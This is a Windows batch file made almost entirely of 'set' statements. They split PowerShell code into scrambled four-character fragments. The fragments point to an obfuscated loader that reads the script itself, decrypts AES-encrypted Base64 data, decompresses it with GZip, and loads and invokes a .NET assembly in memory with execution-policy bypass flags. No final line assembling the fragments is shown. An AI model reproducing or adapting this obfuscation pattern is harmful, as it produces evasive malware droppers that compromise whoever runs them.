@echo off
set "puhhAibrRq=bjec"
set "aflUeCvhRK=6esa"
set "IrfvSbjneN=rans"
set "wUwMlnjiyZ=yTo("
set "tMbgtdzZzs=m.Re"
set "iBMPpjxkGP=and "
set "EpqLRQrteU=g = "
set "DmcXwGUUeJ=);$V"
set "Etxllkoluw=g = "
set "tFjYmGmybL=esaB"
set "dnwnpmqzMd=UGTu"
set "AyIYSiSNyf=]::C"
set "ASVqPXXYUK=.Cry"
set "uLkMNiBvVc='[-1"
set "THmYDqFCQZ='')("
set "HDehsuWYNI=MfUV"
set "BFAgEesPpQ=urit"
set "FGeQKncfWi=..-1"
set "HciLnKgbuH=ZYYc"
set "nunPgbqOyI=Disp"
set "DJWAvCDCsf=);$I"
set "gYhCUdPjHL=e = "
set "FppzRzgEDg=iU ="
set "goffGRrFqA=esFX"
set "KCIZwrnlQr=.Len"
set "fbuHXKmHEA=ress"
set "VjtsvKoSbi=ress"
set "kakTZnwszd=ispo"
set "nBEjIKMNTD=$IzA"
set "EYsFDBWIVW=tmKx"
set "bVQnHmfzBA=Mode"
set "BLJakjkgkm=.Mem"
set "RNXCWPAFgt=ZFal"
set "oCXZrnjdHR=BC;$"
set "jpgNWLdpQe=New-"
set "celvAoIrGl=O.Me"
set "WKRdBFrEOT=stem"
set "lHOacvjiDq=)($N"
set "IsmbLfqQPk=pose"
set "ZUiIWlRxrU=]::("
set "KFRnAcoGJd=Obje"
set "dAYHynqLku=Srg."
set "zGerqfjUnc=yste"
set "qzYpTdyWvN=, $M"
set "wWnvWBZzNe=pDZz"
set "SahXRTsgze=y.Ci"
set "NFamcGQdTo=+hAO"
set "aucVGfiffC=rity"
set "QSFEjjcRVO=..-1"
set "PPmToJGDDY=Conv"
set "TJgqbSVrFQ=in $"
set "XhefYEApXr=Syst"
set "nUsPNTwIAu=sion"
set "lzfkODJBZb=vtaf"
set "XeNCSLsTHB=rity"
set "IMYeXBdjOG=y.Cr"
set "cKqayhmHiK=.Dis"
set "kOvnuQEnnc=;$IL"
set "aSYMQVylXm=]::("
set "XfJTCnFKKz=comp"
set "WEKMvuFjms=esMa"
set "WqMwNyfrgV=lBlo"
set "DRlUmusyRH=ring"
set "KiBlDVTJpv=isfL"
set "bgaqTmREwW=ypto"
set "OmHlmJSNUq=;$Iu"
set "qyUPQAetfe=[]] "
set "yZTtgOZKki=.-16"
set "wrTCwVgNIZ=Vg ="
set "UzUxSRVzjT=Star"
set "CHUXcJdibi=6] -"
set "dGxMlhyABo=; };"
set "NDYHqNzalJ=$ctm"
set "hZKBAgXwxi=U) {"
set "MnzigSVIFJ=am;$"
set "KafaDJZUks=ct S"
set "eIMFUKsXdW=-nop"
set "JPGJibCYKM=hEzi"
set "pGdkSOCoEN=fUVg"
set "LcKRUfGVHM=$hEz"
set "MkDrKKvBAq=tmKx"
set "jiyemhPAfI=al);"
set "FsPWuYSlfO=[Sys"
set "aoljGqokJa=tion"
set "FmLOIhezRS=PKCS"
set "pkzwlBJFne=stem"
set "cGeINXuxDm=pher"
set "ShTNBimXQk=1] -"
set "wJVZboTdsK=nirt"
set "WcNyVZuWah=taf."
set "gqkwxwryJj=ect "
set "eWVlWgmeNb=ew-O"
set "jaKpZGJwdt=ptog"
set "kiFybOWGgq=xFAq"
set "rwkgOGKdYA=em.I"
set "pubyNEoNbl=$MfU"
set "WCzFWquQME=Vg);"
set "UVLfgMvxeP=null"
set "APPFqhiGtc=.Dis"
set "qzWXOPgWlk=orF'"
set "PRqlBcPSzE=tsWi"
set "VkGcZqJeVV=tmKx"
set "ZfkzTmgCkz=('%~f0'"
set "NJJVUICbnP=::De"
set "JiexaWKvrx=);$d"
set "HQSqWtSKYe= = $"
set "vnaORuUVRw=-joi"
set "gaWzFHOAwQ=v = "
set "jtkUhJBhtR=al.T"
set "oqxsddUGiz=igk "
set "WDPgdvKncr=-Obj"
set "FWnSxteIlS=16] "
set "lBKnllDnUt=)))"
set "oghdrucFox=).Sp"
set "hbjHgYvWpp=ck($"
set "ARDletUxTn=ss -"
set "AeXxGpNovW=Comp"
set "SULCTgpEzZ=1..-"
set "tfSmXegtXi=pose"
set "YYyTrvXYvN=[Sys"
set "PppzVdMYRo=('da"
set "GibuaIOPrk=onve"
set "JdXuesSiRE=V = "
set "OqvRKjsrcF=[IO."
set "SeOaHjzrvy=S46e"
set "fsuMAHezHc=v4Ir"
set "tEHbTDPtnn=fore"
set "HieKMMRnJe=('l0"
set "niNxSaNDJh=MfUV"
set "xgFxwajveQ=.Ass"
set "IsfRrEqSex=ptor"
set "rZupCOzJhy=mory"
set "TPNThpVxWT=m.IO"
set "pnATMewCLf=ke($"
set "yotFbOAJGL=$dZF"
set "ucDtNUasxH=raph"
set "xDPOVMMVpp=.Con"
set "ujbjIkUOyr=tem."
set "beuKnbgObw=);$c"
set "bEnVBkBKOr=HAeI"
set "MkCyUhuFVX== [S"
set "uVjDntcULI= = ["
set "eFNzizvbvk=gMod"
set "EKgNfRWywk=);$c"
set "tCXXWSZNdG=[-1."
set "hdHbwRTYRa=.Key"
set "JdrFUWBoQe=$dZF"
set "UONWUKQFci=aOgs"
set "FTOeIJxdyA= New"
set "YkXMNUgEVA=ode]"
set "NSFZDDYgQE=x.Pa"
set "LnwobaFYtW=Secu"
set "mOtsyIEpWA=nage"
set "xUyssHUfkg=Syst"
set "adgQANLaKA=brea"
set "VTPdLenXzX=gk.T"
set "zKPWcFsOPr=$dZF"
set "BFIPJuTggf=;$aO"
set "uVGTEDXsxc= = N"
set "cOihNIzBxt=, (,"
set "reXevDekkP=-joi"
set "fxhKYxhTus=-1.."
set "hgcYcayGeI=tem."
set "MRYLQGfxro=eIg "
set "TdSoDlDlIR= = $"
set "rnSmlanQGN=bstr"
set "wjCOSDbYsd=::('"
set "SwPSdpvICZ=Kx.I"
set "POxmccMFIf=ment"
set "RWtIzlYKcO=ion."
set "dDutZXVZAo=Comp"
set "jcjBLOTbTk=]::N"
set "QcgoHKqWba=tmKx"
set "MezRfQRyaV=;$Vv"
set "euhtCYeNWU= [Sy"
set "PwMcqQdHDD='dqR"
set "LjexcFcVDG=oryS"
set "iArrMryeET=.Cre"
set "TldiOPfVIK=gnir"
set "YecCQBXfSP=ress"
set "RFUScLfVQb=7Yiv"
set "UTThFJBUMR= [st"
set "dOrYsTgVrA=stem"
set "WFtvDAhSvv=7;$c"
set "VriHeAHSxf=ert]"
set "NzJIFxFpXk=pres"
set "LWrsovEXyi=ose("
set "FYUZbRYayZ=iron"
set "eGYxXzXQWt=ddin"
set "qeEYtMVYFS=Invo"
set "EeJPkTuMhF=ose("
set "gHsjBtTRSv=3HWs"
set "dTHzLrVroV=File"
set "gVsDUZZOQC=y.Pa"
set "HWwIXxZllg===')"
set "hCPJmiBdLK='txe"
set "VZVeUWkTpE=ctmK"
set "swbbKpQRqt=F'[-"
set "ZqGbjuxHQU=();$"
set "UnMvOpwyqW=raph"
set "FTTxeuFtFs= [Sy"
set "LKNoMGbqCu=le  "
set "IuEBZhsEcs=ing("
set "uaqLHAeXnC='[-1"
set "IJdqsDsXMO=rtS4"
set "yaEgVfyAfJ=t Sy"
set "YOEsEdMfHt=ecry"
set "UgLetzmfsM=[Sys"
set "zrVbbsfGHK=-4] "
set "fWsZzvkAfR=g.Su"
set "SReyCMMEKG=Obje"
set "DtcLbgdRxs=ateD"
set "BrFBSLneci=hy.A"
set "MRQgRcdrsk=TllA"
set "aKeIZmQBce=)) {"
set "jDJQzezmiK=New-"
set "AfxHWEbCrF=ptog"
set "NeboOyAWQR=g = "
set "PTdJFUEwHB=.GZi"
set "YWhnOdpmut=ach "
set "aLSCJwBDts=vert"
set "odndNoaxgv=tem."
set "rUwaQYYPwy=();$"
set "ACaLcSxtSE=fUVg"
set "yQNYROkbfp=g, 0"
set "OAnfkgkqhd=[Env"
set "kzkbWNsnMH=al ="
set "IHlzfJnaSp=morF"
set "LSJWwmTimr=oArr"
set "UZRfHTtyhS=MfUV"
set "lvPapMBeyq=join"
set "lAzEBbdeCs='gni"
set "YSUgzpmLHy= if "
set "rZhJhxnlto=grap"
set "ZscJqgwPIL=($HA"
set "HXtFQNdetI=lit("
set "KGAMGaQabn=eam("
set "UVTeHSmnXP=.IO."
set "xbYFZkkUcb=ay()"
set "kqQmCUugoX=ILSr"
set "XkhLgANiMA=-ep "
set "kwEULTXsZM=em.C"
set "fRCYgbDvPS= '')"
